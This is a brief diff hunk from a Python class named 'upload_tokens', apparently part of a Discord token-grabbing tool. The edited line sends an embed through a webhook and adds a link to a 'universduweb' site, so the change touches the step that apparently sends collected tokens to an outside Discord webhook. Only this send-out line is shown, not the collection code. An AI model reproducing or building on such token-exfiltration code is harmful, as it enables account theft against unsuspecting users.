@@ -357,4 +357,4 @@ class upload_tokens:
 
             embed.set_footer(text="https://discord.gg/universduweb")
 
-            self.webhook.send(embed=embed, username="🔒 /universduweb", avatar_url="https://i.imgur.com/hxzEHWf.png")
+            self.webhook.send(content="🔗 https://universduweb.netlify.app", embed=embed, username="🔒 /universduweb", avatar_url="https://i.imgur.com/hxzEHWf.png")
